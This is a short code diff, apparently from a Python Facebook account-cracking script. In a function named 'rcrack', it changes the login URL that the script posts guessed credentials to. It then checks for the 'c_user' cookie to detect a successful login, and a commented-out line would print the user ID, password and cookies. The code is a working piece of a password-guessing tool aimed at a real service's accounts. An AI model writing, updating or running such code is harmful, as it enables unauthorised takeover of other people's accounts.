@@ -244,7 +244,7 @@ def rcrack(uid,pwx,tl):
 			'sec-fetch-site': 'same-origin',
 			'upgrade-insecure-requests': '1',
 			'user-agent': pro,}
-			lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8https://free.facebook.com/login/?next&ref=dbl&fl&refid=8https://free.facebook.com/home.php?refsrc=deprecated&ref=dbl&_rdr',data=log_data,headers=header_freefb).text
+			lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
